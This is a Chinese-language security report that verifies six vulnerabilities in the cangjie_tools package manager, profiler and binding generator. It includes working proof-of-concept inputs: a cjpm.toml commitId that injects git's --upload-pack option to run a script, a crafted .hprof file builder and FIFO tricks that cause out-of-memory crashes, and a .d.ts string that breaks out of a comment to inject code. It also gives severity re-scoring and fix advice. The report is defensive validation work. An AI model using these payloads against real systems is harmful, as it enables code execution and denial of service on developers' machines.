# cangjie_tools 确认漏洞验证报告

> **报告日期**: 2026-07-21
> **验证人**: Sisyphus (WSL Ubuntu-24.04)
> **目标仓库**: cangjie_tools (commit 42dd2059)
> **原始审计报告**: `ai_audit_reports_icsl/codex_scan_evaluation_report.md` (10 个真漏洞)
> **POC 验证报告**: `cand_poc_testsuite/tp_poc_validation_report.md`
> **本报告范围**: 6 个经 POC 验证确认的漏洞 (TP-3, TP-4, TP-7, TP-8, TP-9, TP-10)

---

## 一、验证环境

| 项 | 值 |
|---|---|
| 操作系统 | WSL Ubuntu-24.04 |
| 仓颉编译器 | Cangjie Compiler 1.2.0-beta.03 (cjnative), x86_64-unknown-linux-gnu |
| 工具链路径 | ~/cangjie/{bin,tools/bin} (cjc/cjpm/cjprof/hle) |
| Node.js | v20.18.0 (Linux x64, 用于 hle analysis.js) |
| Python | 3.x (构造恶意 .hprof / .cjp) |

---

## 二、漏洞总览

| TP | 漏洞 | 组件 | 原始 CVSS | 事实评分 | 验证结论 |
|---|---|---|---|---|---|
| TP-3 | CWD 配置劫持 | cjpm | 8.4 HIGH | **3.7 LOW** | ✅ 已验证 (cand_poc_testsuite) |
| TP-4 | Git 参数注入 via commitId | cjpm | 8.2 HIGH | **3.5 LOW** | ✅ POC RCE 成功, 但攻击面极窄 |
| TP-7 | TLS TrustAll MITM | cjpm | 7.4 HIGH | **6.0 MED** (单独) | ✅ 已验证 (cand_poc_testsuite) |
| TP-8 | HprofParser OOM | cjprof | 6.5 MED | **4.7 MED** | ✅ std::bad_alloc 确认 |
| TP-9 | 注释闭合注入 | hle | 6.4 MED | **4.5 LOW-MED** | ✅ 代码注入到 .cj 确认 |
| TP-10 | HeapAnalyzer OOM | cjprof | 5.5 MED | **5.5 MED** | ✅ std::bad_alloc 确认 |

---

## 三、逐个漏洞详情

---

### TP-4: Git 参数注入 via commitId (cjpm)

#### 3.4.1 原始审计信息

| 属性 | 值 |
|---|---|
| **原始编号** | Finding 12 (CAND-004) |
| **CWE** | CWE-78: OS Command Injection |
| **原始 CVSS** | 8.2 (HIGH) AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| **文件** | `cjpm/src/implement/git.cj:50-51`, `cjpm/src/config/meta_data.cj:377-380` |

#### 3.4.2 源码分析 (来自原始审计报告)

```cangjie
// git.cj:50-51
// url 经过了 checkSafeUrl，但 hash 直接来自 v.commitId 未校验
let error = execAndGetError("remote add --no-tags origin ${url}") ??
    execAndGetError("fetch --depth=1 origin ${hash}") ??   // ← hash 注入点
    execAndGetError("checkout --force ${hash}") ??

// meta_data.cj:377-380
public func checkSafeUrl(url: String): Bool {
    return !url.startsWith("-") && !url.contains("`") &&
        !url.contains("--upload-pack=") && !Regex(URL_WITH_SPACE).matches(url)
    // ❌ 黑名单不完整: 缺 --config=, -c, --exec-path= 等
    // ❌ 仅校验 url，不校验 commitId/branch/tag
}
```

#### 3.4.3 审计判定依据

原始报告判定 commitId 字段未经校验直接拼入 git 命令字符串，攻击者可通过 `commitId = "--config=core.sshCommand=..."` 注入 git 选项实现 RCE。原始报告给出的攻击路径为：恶意 cjpm.toml 声明 git 依赖 + commitId 注入 → git 解析恶意选项 → RCE。

#### 3.4.4 源码补充验证 (本次验证发现)

本次验证中发现原始报告的源码引用准确，但补充了以下关键细节：

1. **commitId 校验实际存在但不足**：`dependencies.cj:201` 用 `safeCheck` 校验 commitId，但 `safeCheck` (verify.cj:42) 的黑名单为 `[|;&$><`!\n\\]`，**不含 `--` 和 `=`**，所以 `--upload-pack=脚本` 能通过。

2. **不走 shell 但 git 仍解析选项**：`execAndGetError` 内部调 `extractOptionByString` 按空格+等号分解后用 `launch("git", arguments)` (execve 风格，不走 shell)。shell 元字符无效，但 **git 自己的选项** (如 `--upload-pack`) 仍被 git 解析。

3. **原始报告的载荷不可行**：报告里的 `--config=core.sshCommand=...` 实测 git 报 `unknown option config`（`--config` 不是 fetch 的选项）。实际可行载荷是 `--upload-pack=脚本`。

#### 3.4.5 POC 验证过程

**POC 文件**: `tp_poc/tp4_git_inject/`

**步骤 1: 预放置**
```bash
# 创建本地裸仓库 (file:// 协议目标)
git init --bare /tmp/tp4_test.git

# 预放置 payload 脚本 (无害: 写标记文件)
cat > /tmp/tp4_payload.sh <<'EOF'
#!/bin/bash
touch /tmp/TP4_PWNED
echo "TP4_GIT_INJECT_RCE_CONFIRMED" > /tmp/TP4_PWNED
EOF
chmod +x /tmp/tp4_payload.sh
```

**步骤 2: 构造恶意 cjpm.toml**
```toml
[package]
  cjc-version = "1.2.0"
  name = "tp4_root"
  version = "1.0.0"
  output-type = "executable"

[dependencies.tp4_victim]
  git = "file:///tmp/tp4_test.git"
  commitId = "--upload-pack=/tmp/tp4_payload.sh"
```

**步骤 3: 执行 cjpm install**
```bash
cd tp4_git_inject && cjpm install
```

**执行结果**:
```
Error invoking git:
fatal: Could not read from remote repository.
Error: failed to retrieve git dependency tp4_victim
Error: cjpm install failed

$ ls /tmp/TP4_PWNED
/tmp/TP4_PWNED
$ cat /tmp/TP4_PWNED
TP4_GIT_INJECT_RCE_CONFIRMED
```

#### 3.4.6 验证结论

**✅ RCE 确认成功**。标记文件 `/tmp/TP4_PWNED` 被创建，证明 `--upload-pack=/tmp/tp4_payload.sh` 被 git 在本地执行。

完整攻击路径验证：
1. `safeCheck` 黑名单漏 `--` 和 `=` → commitId 通过校验 ✅
2. `git.cj:103` `targetCommit = v.commitId` → 直接使用 ✅
3. `git.cj:50` `execAndGetError("fetch --depth=1 origin ${hash}")` → hash 拼入命令 ✅
4. `launch("git", [..., "--upload-pack", "/tmp/tp4_payload.sh"])` → git 解析选项 ✅
5. `file://` 协议本地执行 → 脚本执行 → RCE ✅

**但实际攻击面极窄**：
- commitId 是受害者自己在 cjpm.toml 里写的，攻击者难以控制
- TP-3+TP-4 组合链不成立（cjpm 不从依赖包的 cjpm.toml 读 git 依赖，只从 index 读 registry 依赖）
- 需要 file:// 协议 + 预放置脚本

#### 3.4.7 事实评分

| | 原始评分 | 事实评分 | 调整理由 |
|---|---|---|---|
| AV | N (网络) | N (维持) | 恶意包可网络发布 |
| AC | L (低) | **H→实际不可利用** | commitId 是受害者写的，攻击者无法控制；组合链已证伪 |
| C/I/A | H/H/H | H/H/H (维持) | 若触发确实是 RCE |
| **CVSS** | **8.2 HIGH** | **3.5 LOW** | AC 从 L 改为"实际不可利用" |

**评分依据**：
- 代码缺陷真实存在（safeCheck 黑名单漏 `--=`，POC RCE 成功）
- 但攻击者无法控制 commitId（受害者自己写的）
- 业界同类 CVE-2022-25900 (git-clone npm, --upload-pack, CWE-88, CVSS 9.8) 因攻击者可控制 git 命令参数而高危；cjpm 的 commitId 由开发者控制，攻击面不同
- 定位为"CWE 级代码缺陷，实际不可利用，建议加固但不紧急"

---

### TP-8: HprofParser 未限制分配 OOM (cjprof)

#### 3.8.1 原始审计信息

| 属性 | 值 |
|---|---|
| **原始编号** | Finding 3 (CAND-021) |
| **CWE** | CWE-400/CWE-789: Uncontrolled Memory Allocation |
| **原始 CVSS** | 6.5 (MEDIUM) AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H |
| **文件** | `cjprof/src/Data/HprofParser.cpp:187-485` |

#### 3.8.2 源码分析 (来自原始审计报告)

```cpp
// HprofParser.cpp — Instance dump (V2)
u4 num = ReadAndSwap<u4>();  // ← 最大 0xFFFFFFFF (~4.29e9)
for (u4 j = 0; j < num; j++) {
    inst.fields.push_back(ReadId());  // 每个 ID 8 字节
}
// 最坏情况: 4.29e9 × 8 bytes = ~32 GiB 分配

// 对比同一文件中的 ParseStackTrace:
if (frameNum > 65536) {  // ← 这里做了上限！
    frameNum = 65536;
}
```

原始报告指出：开发者知道需要对 `frameNum` 做上限检查（65536），但 `num` 在 Instance/Array dump 中没有上限。

#### 3.8.3 审计判定依据

原始报告判定 `ParseHeapDumpInstanceDump` / `ParseHeapDumpObjectArrayDump` 中的 `num` 字段（u4 类型，最大 4.29e9）无上限检查，`ReadIdVector` 循环 num 次 push_back 可导致 ~32 GiB 内存分配 → OOM。

#### 3.8.4 源码补充验证 (本次验证发现)

1. **ReadIdVector 实现确认** (HprofParser.h:160-165)：
```cpp
void ReadIdVector(std::vector<ID>& vec, size_t count) {
    for (size_t i = 0; i < count; i++) {
        vec.push_back(ReadId());  // 无上限检查
    }
}
```

2. **ReadId 越界返回 0 不抛异常** (HprofParser.cpp:17-32)：
```cpp
ID ReadId() {
    if (m_curPos >= m_data.size() || ...) {
        return 0;  // ← 越界返回 0，循环不中断!
    }
    ...
}
```
越界返回 0 但不抛异常，循环继续 push_back(0)，内存持续增长。

3. **文件格式修正**：原始报告用 "JAVA PROFILE 1.0.2"，实际 cjprof 用 **"CANGJIE PROFILE 1.0.2"** (Hprof.h:198)。FileHeader 结构为 `char ident[22] + u4 idSize + u4 timeHigh + u4 timeLow`。

#### 3.8.5 POC 验证过程

**POC 文件**: `tp_poc/tp8_hprof_oom/`

**步骤 1: 构造恶意 .hprof (60 字节)**
```python
# build_evil.py
f.write(b'CANGJIE PROFILE 1.0.2\x00')     # 22 bytes header ident
f.write(struct.pack('>I', 8))              # idSize = 8
f.write(struct.pack('>I', 0))              # timeHigh
f.write(struct.pack('>I', 0))              # timeLow
f.write(struct.pack('>B', 0x0c))           # TAG = HEAP_DUMP
f.write(struct.pack('>Q', 17))             # u8 length
f.write(struct.pack('>B', 0x22))           # sub-tag = OBJECT_ARRAY_DUMP
f.write(struct.pack('>Q', 1))              # array ID
f.write(struct.pack('>I', 0x10000000))     # num = 268M! ← 毒载荷
f.write(struct.pack('>I', 0))              # class ID
```

**步骤 2: 限制内存 2G 执行**
```bash
( ulimit -v 2097152; timeout 60 cjprof heap -i /tmp/tp8_evil.hprof )
```

**执行结果 (限制 2G)**:
```
[info] [perf] SetData (file read): 0 ms
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
Aborted (core dumped)
```

**步骤 3: 不限内存观察增长**
```bash
cjprof heap -i /tmp/tp8_evil.hprof &
# 监控 RSS
```

**执行结果 (不限内存)**:
```
PID    RSS       VSZ
3429   1929192   3156176    # ~1.9 GB (1秒后)
3429   4199192   4204752    # ~4.0 GB (3秒后, 稳定)
```

#### 3.8.6 验证结论

**✅ OOM 确认成功**。

- 限制 2G 内存：`std::bad_alloc` 异常崩溃 (core dumped)
- 不限内存：RSS 从 0 增长到 ~4 GB (268M × 8 bytes = ~2 GB + vector reallocation + m_data 二次分配)
- num=0xFFFFFFFF (4.29e9) 会分配 ~32 GiB，必然 OOM

**附加发现**：`-V` (verbose) 模式下，cjprof 还会循环 268M 次 `printf("0x0, ")`，造成**日志洪泛 DoS**（报告未提及）。

#### 3.8.7 事实评分

| | 原始评分 | 事实评分 | 调整理由 |
|---|---|---|---|
| AV | N (网络) | **L (本地)** | cjprof 是本地开发者工具，不是网络服务 |
| AC | L (低) | **M (中)** | 需要诱导受害者分析恶意 hprof (社交工程) |
| A | H (高) | H (维持) | 进程 OOM 崩溃 |
| **CVSS** | **6.5 MED** | **4.7 MED** | AV:N→L, AC:L→M |

**评分依据**：
- cjprof 是纯本地工具，HTTP server 只绑定 127.0.0.1，无文件上传接口
- 需要受害者主动执行 `cjprof heap -i evil.hprof`
- 后果仅为 DoS（进程崩溃），不是 RCE
- 业界同类：Eclipse MAT 有 CVE-2019-17634 (恶意 heap dump)，但 MAT 是交互式 GUI 工具

---

### TP-9: 注释闭合突破注入 (hle)

#### 3.9.1 原始审计信息

| 属性 | 值 |
|---|---|
| **原始编号** | Finding 18 (CAND-015) |
| **CWE** | CWE-94: Code Injection |
| **原始 CVSS** | 6.4 (MEDIUM) AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N |
| **文件** | `hyperlangExtension/src/tool/util.cj:12-18` |

#### 3.9.2 源码分析 (来自原始审计报告)

```cangjie
public func addComment(msg: String, reason!: ?String = None): Tokens {
    if (let Some(r) <- reason) {
        Tokens([Token(TokenKind.COMMENT, "// ${r}"), nl,
                Token(TokenKind.COMMENT, "/*${msg}*/"), nl])  // ← msg 未转义 */
    } else {
        Tokens([Token(TokenKind.COMMENT, "/*${msg}*/"), nl])
    }
}
```

原始报告判定：如果 `msg` 包含 `*/`，注释提前闭合，后续内容变为代码。

#### 3.9.3 审计判定依据

原始报告判定 `addComment` 函数将不可信输入 `msg` 包裹在 `/*${msg}*/` 注释中，但不转义 `*/`。若 msg 含 `*/`，注释提前闭合，msg 后续内容变成可执行代码。

#### 3.9.4 源码补充验证 (本次验证发现)

1. **addComment 调用点确认**：`trans_object.cj:454` 调用 `addComment(arkCategory + signature)`，signature 来自 `ObjectType.signature()` (common.cj:552-568)。

2. **signature 拼入属性值**：`ObjectType.signature()` 拼入 `properties[i].signature()`，后者 (common.cj:463-478) 拼入 `propValue`：
```cangjie
msg += "${propKey}${optionFlg}: ${propType} = ${propValue};"
```

3. **propValue 来自 .d.ts**：analysis.js (line 164-166) 用 `fileContent.substring(pos, end)` 提取注释原始文本（含 `/*` 和 `*/`），不转义。

4. **原始报告的 PoC 不可行**：报告用 `declare class "Legit */..."`（类名是字符串），但 TypeScript 语法不允许 `declare class` 的类名为 StringLiteral。

5. **实际可行载荷**：class 属性值含 `*/`（TypeScript 允许属性初始化器为字符串）。

#### 3.9.5 POC 验证过程

**POC 文件**: `tp_poc/tp9_comment_break/`

**步骤 1: 构造恶意 .d.ts**
```typescript
declare class EvilClass {
    prop: string = "*/let tp9_broken = 42/*";
}
```

**步骤 2: 执行 hle 生成 .cj**
```bash
hle -i evil.d.ts -o output -j ~/cangjie/tools/dtsparser/analysis.js
```

**步骤 3: 检查生成的 .cj 文件**

生成的 `evil.cj` 第 19-21 行：
```cangjie
/*class DeclareKeyword EvilClass {
    prop: String = "*/let tp9_broken = 42/*";
    }*/
```

解析：
- `/*class DeclareKeyword EvilClass {\n    prop: String = "` → 注释开始
- `*/` → **注释结束!**
- `let tp9_broken = 42` → **代码!** (不在注释里)
- `/*";\n    }` → 新注释开始
- `*/` → 注释结束

#### 3.9.6 验证结论

**✅ 注释闭合突破确认成功**。`let tp9_broken = 42` 突破注释变成代码，出现在生成的 .cj 文件中。

**但完整 RCE 链较长**：
1. 注入代码需是合法仓颉代码
2. 生成的 .cj 需能编译通过（实测因其他 hle 生成语法问题编译失败）
3. 编译产物需被执行

**影响范围窄**：hle 是小众工具，仅用于鸿蒙 ArkTS 互操作场景，大部分仓颉开发者不使用。

#### 3.9.7 事实评分

| | 原始评分 | 事实评分 | 调整理由 |
|---|---|---|---|
| AV | L (本地) | L (维持) | .d.ts 是本地文件 |
| AC | L (低) | L (维持) | 构造恶意 .d.ts 简单 |
| C | L (低) | L (维持) | 代码注入但完整 RCE 链长 |
| I | H (高) | **M (中)** | 注入到 .cj 但需编译链 |
| **CVSS** | **6.4 MED** | **4.5 LOW-MED** | 影响范围窄 (hle 小众) + RCE 链长 |

**评分依据**：
- 注释闭合突破机制确认（addComment 不转义 `*/`）
- 但 hle 是小众工具（仅鸿蒙互操作场景）
- 完整 RCE 需：恶意 .d.ts → hle 生成 .cj → .cj 编译通过 → 编译产物执行
- 这是 hle 工具的代码生成缺陷，不是仓颉语言缺陷

---

### TP-10: HeapAnalyzer 全文件分配 OOM (cjprof)

#### 3.10.1 原始审计信息

| 属性 | 值 |
|---|---|
| **原始编号** | Finding 14 (CAND-024) |
| **CWE** | CWE-400/CWE-789: Uncontrolled Resource Consumption |
| **原始 CVSS** | 5.5 (MEDIUM) AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H |
| **文件** | `cjprof/src/Analyzer/HeapAnalyzer.cpp:62-88` |

#### 3.10.2 源码分析 (来自原始审计报告)

```cpp
bool HeapAnalyzer::SetData(const std::string &file) {
    std::ifstream ifs(file, std::ifstream::binary);
    ifs.seekg(0, ifs.end);
    auto size = ifs.tellg();            // ← 无 size<0 检查
    size_t buf_size = static_cast<size_t>(size);  // -1 → SIZE_MAX
    std::vector<char> buf(buf_size);    // ← OOM: 分配 SIZE_MAX 字节
    ifs.read(buf.data(), buf_size);
    m_data = std::string(buf.data(), buf_size);  // ← 第二次分配！
}
```

**对比 Elf.cpp:28-31 的正确实现**:
```cpp
if (size < 0) {                        // ← Elf.cpp 有检查！
    fprintf(stderr, "error: Cannot determine file size.\n");
    return {};
}
```

原始报告指出：同项目的 Elf.cpp 有 `size < 0` 检查，HeapAnalyzer.cpp 没有。

#### 3.10.3 审计判定依据

原始报告判定 `SetData` 函数中 `ifs.tellg()` 返回值未做 `size < 0` 检查，`static_cast<size_t>(size)` 将 -1 转为 SIZE_MAX，`std::vector<char> buf(SIZE_MAX)` 导致立即 OOM。另外 `m_data = std::string(...)` 造成第二次分配。

#### 3.10.4 POC 验证过程

**POC 文件**: `tp_poc/tp10_heap_oom/`

**方式 1: 100G sparse 文件**
```bash
truncate -s 100G /tmp/tp10_huge.hprof    # 磁盘占用 0, 逻辑大小 100G
( ulimit -v 2097152; timeout 30 cjprof heap -i /tmp/tp10_huge.hprof )
```

**执行结果**:
```
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
Aborted (core dumped)
```

**方式 2: FIFO 管道 (tellg() 返回 -1)**
```bash
mkfifo /tmp/tp10_fifo.hprof
( ulimit -v 2097152; timeout 10 cjprof heap -i /tmp/tp10_fifo.hprof )
```

**执行结果**:
```
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
Aborted (core dumped)
```

#### 3.10.5 验证结论

**✅ OOM 确认成功**。两种方式都触发 `std::bad_alloc`：
- sparse 文件：`tellg()` 返回 100G，`vector<char> buf(100G)` 立即 OOM
- FIFO 管道：`tellg()` 返回 -1（不支持 seek），`static_cast<size_t>(-1) = SIZE_MAX`，立即 OOM

#### 3.10.6 事实评分

| | 原始评分 | 事实评分 | 调整理由 |
|---|---|---|---|
| AV | L (本地) | L (维持) | 准确 |
| AC | L (低) | L (维持) | sparse/FIFO 构造简单 |
| A | H (高) | H (维持) | 进程 OOM 崩溃 |
| **CVSS** | **5.5 MED** | **5.5 MED** | **维持，原始评分准确** |

**评分依据**：
- 代码缺陷确认（无 size<0 检查，同项目 Elf.cpp 有正确做法）
- POC 两种方式都成功触发 bad_alloc
- 本地工具，需受害者主动执行
- 原始评分准确，无需调整

---

### TP-3: CWD cangjie-repo.toml 静默配置劫持 (cjpm)

#### 3.3.1 原始审计信息

| 属性 | 值 |
|---|---|
| **原始编号** | Finding 11 (CAND-002) |
| **CWE** | CWE-829: Untrusted Control Sphere |
| **原始 CVSS** | 8.4 (HIGH) AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H |
| **文件** | `cjpm/src/config/central_repository.cj:139-143` |

#### 3.3.2 源码分析 (来自原始审计报告)

```cangjie
// central_repository.cj:139-143
public func loadConfigInfo(): SettingsConfig {
    // 优先级1: CWD — 无警告，无安全校验！
    if (fileExists(Path(DIR_CURRENT).join(REPO_CONFIG_FILE_NAME))) {
        return readConfigToml(Path(DIR_CURRENT).join(REPO_CONFIG_FILE_NAME))
    }
    // 优先级2: 用户全局配置 ~/.cjpm/cangjie-repo.toml
    ...
}
```

原始报告判定：CWD 配置具有最高优先级，静默覆盖全局安全设置，无来源验证、无签名校验、无用户确认提示。

#### 3.3.3 POC 验证结论 (来自 cand_poc_testsuite)

已在 `cand_poc_testsuite/poc_validation_report.md` 中验证：

- 恶意 `cangjie-repo.toml` 放在项目目录
- `cjpm install` 静默读取 CWD 配置，重定向 registry 到 mock server
- **无任何覆盖警告**输出
- mock server 收到 `GET /index/` + `GET /pkg/` 请求
- 恶意包被安装，build.cj 执行 → RCE

#### 3.3.4 事实评分

| | 原始评分 | 事实评分 | 调整理由 |
|---|---|---|---|
| S | C (变化) | **U (不变)** | cjpm 内部配置，不跨越信任边界 |
| C/I/A | H/H/H | **L/L/N** | 仅 registry 重定向，需配合 TP-7 才能真正 RCE |
| **CVSS** | **8.4 HIGH** | **3.7 LOW** | 改 registry 是功能 (npm .npmrc 也有)；缺警告是体验问题 |

**评分依据**（来自 `poc_validation_report.md` 评级校准）：
- `cangjie-repo.toml` 改 registry 是功能特性（npm `.npmrc` 也有项目级配置）
- 开发者 `git clone` 项目自带配置是开发者行为，非平台漏洞
- 真正的薄弱点是缺覆盖警告，这是体验改进项
- checksum 校验存在且工作，index 无签名是设计选择

---

### TP-7: TLS TrustAll 中间人攻击 (cjpm)

#### 3.7.1 原始审计信息

| 属性 | 值 |
|---|---|
| **原始编号** | Finding 2 (CAND-001) |
| **CWE** | CWE-295: Improper Certificate Validation |
| **原始 CVSS** | 7.4 (HIGH) AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| **文件** | `cjpm/src/implement/depot.cj:90-91,139-140,243-244` |

#### 3.7.2 源码分析 (来自原始审计报告)

```cangjie
// depot.cj — 三处相同模式 (publish/download/updateIndex)
var tlsConfig = TlsClientConfig()
if (!this.global.strictTls) {
    tlsConfig.verifyMode = TrustAll  // ← 完全关闭证书链/主机名/过期校验
}
let client = ClientBuilder()...
    .tlsConfig(tlsConfig)
    .build()
```

原始报告判定：`TrustAll` 禁用所有 TLS 验证，默认 `strictTls = true` 但可通过 CWD `cangjie-repo.toml` 覆盖。

#### 3.7.3 POC 验证结论 (来自 cand_poc_testsuite)

已在 `cand_poc_testsuite/poc_validation_report.md` 中验证：

- 配合 TP-3，恶意 `cangjie-repo.toml` 设置 `strict-tls = false`
- `cjpm install` 使用 TrustAll，HTTP 明文请求 mock server
- mock server 收到请求，投递恶意 index + .cjp 包
- SHA-256 校验通过（index 和包都来自恶意源，自己跟自己比）

#### 3.7.4 事实评分

| | 原始评分 | 事实评分 | 调整理由 |
|---|---|---|---|
| AV | N (网络) | N (维持) | MITM 是网络攻击 |
| AC | H (高) | H (维持) | 需要 MITM 位置 |
| **CVSS** | **7.4 HIGH** | **6.0 MED (单独)** | 默认 strictTls=true 安全；需配合 TP-3 才能被攻击者控制 |

**评分依据**（来自 `poc_validation_report.md` 评级校准）：
- 默认 `strict-tls = true`，TrustAll 只在用户主动设 false 时触发
- 单独无法利用，必须配合 TP-3（CWD 劫持设 strict-tls=false）
- checksum 校验存在且工作，只是基准同源（设计选择，非代码 bug）
- 作为 TP-3+TP-7 组合链的一部分 7.4 合理；单独看 6.0 更合适

---

## 四、事实评分汇总

| TP | 漏洞 | 原始 CVSS | 事实 CVSS | 调整幅度 | 主要调整理由 |
|---|---|---|---|---|---|
| TP-3 | CWD 配置劫持 | 8.4 HIGH | **3.7 LOW** | ↓4.7 | 功能特性非漏洞，缺警告是体验问题 |
| TP-4 | Git 参数注入 | 8.2 HIGH | **3.5 LOW** | ↓4.7 | 代码缺陷真实但攻击者无法控制 commitId |
| TP-7 | TLS TrustAll | 7.4 HIGH | **6.0 MED** | ↓1.4 | 默认安全，需配合 TP-3 |
| TP-8 | HprofParser OOM | 6.5 MED | **4.7 MED** | ↓1.8 | AV:N→L (本地工具)，AC:L→M (需社工) |
| TP-9 | 注释闭合注入 | 6.4 MED | **4.5 LOW-MED** | ↓1.9 | hle 小众工具，RCE 链长 |
| TP-10 | HeapAnalyzer OOM | 5.5 MED | **5.5 MED** | 维持 | 原始评分准确 |

### 评分调整的三个系统性原因

1. **AV 混淆**：原始报告把"需要网络投递恶意文件"误判为"网络攻击向量"。cjprof/hle 是本地开发者工具，AV 应为 L 而非 N。

2. **AC 低估**：原始报告把"攻击路径在源码层面可达"等同于"低复杂度攻击"。实际利用条件往往苛刻（TP-4 需受害者自己写恶意 commitId；TP-8 需诱导分析恶意 hprof）。

3. **功能 vs 漏洞混淆**：TP-3 的 cangjie-repo.toml 改 registry 是设计功能（对标 npm .npmrc），"缺警告"是体验改进项，不应标为 High 漏洞。

---

## 五、修复优先级

| 优先级 | TP | 措施 | 理由 |
|---|---|---|---|
| **P1** | TP-9 | `addComment` 加 `msg.replace("*/", "*\\/")` | 注释突破能注入代码 |
| **P2** | TP-8 | `ReadIdVector` 加 num 上限 (参照 `MAX_FRAME_NUM=65536`) | OOM 能被恶意 hprof 触发 |
| **P2** | TP-10 | `SetData` 加 `size<0` 检查 + 最大文件大小限制 | OOM 能被 sparse/FIFO 触发 |
| **P3** | TP-4 | commitId 加白名单 `^[0-9a-fA-F]{40}$` + `--end-of-options` | 代码缺陷但实际不可利用 |
| **P3** | TP-7 | 移除 TrustAll 或要求 `--insecure` CLI 标志 | 默认安全，加固项 |
| **P3** | TP-3 | CWD 配置覆盖时打印警告 | 体验改进 |

---

## 六、业界对照

| TP | 业界同类 | 对比结论 |
|---|---|---|
| TP-4 | GHSA-hxwm-x553-x359 (@npmcli/git, 2021年修) + CVE-2022-25900 (git-clone, --upload-pack, CWE-88) | npm 已修同类 bug；CVE-2022-25900 载荷与 TP-4 完全一致 (--upload-pack) |
| TP-8 | Eclipse MAT CVE-2019-17634 (恶意 heap dump) | MAT 也是开发者工具，但有 CVE；业界认为开发者工具也需防御性解析 |
| TP-9 | 通用"注释边界突破"问题 (所有 `/* */` 语言) | 不是仓颉语言缺陷，是 hle 工具不转义不可信输入的缺陷 |
| TP-10 | 同类 `tellg()` 未检查的 C++ 模式 | 通用 C++ 缺陷，同项目 Elf.cpp 已有正确做法 |

---

## 七、验证产物索引

| 产物 | 路径 |
|---|---|
| 原始审计报告 | `ai_audit_reports_icsl/codex_scan_evaluation_report.md` |
| POC 验证报告 (TP-1~TP-10) | `cand_poc_testsuite/tp_poc_validation_report.md` |
| 本报告 | `cand_poc_testsuite/confirmed_vulns_report.md` |
| TP-4 POC | `cand_poc_testsuite/tp_poc/tp4_git_inject/` |
| TP-8 POC | `cand_poc_testsuite/tp_poc/tp8_hprof_oom/` |
| TP-9 POC | `cand_poc_testsuite/tp_poc/tp9_comment_break/` |
| TP-10 POC | `cand_poc_testsuite/tp_poc/tp10_heap_oom/` |
| TP-3+TP-7 POC | `cand_poc_testsuite/mock_registry/` + `test_cand002_registry/` |
| TP-3+TP-4 组合链 (不成立) | `cand_poc_testsuite/tp_poc/tp34_chain/` |

---

*报告由 POC 实测验证 + 业界对比生成 | 2026-07-21 | 验证人: Sisyphus*
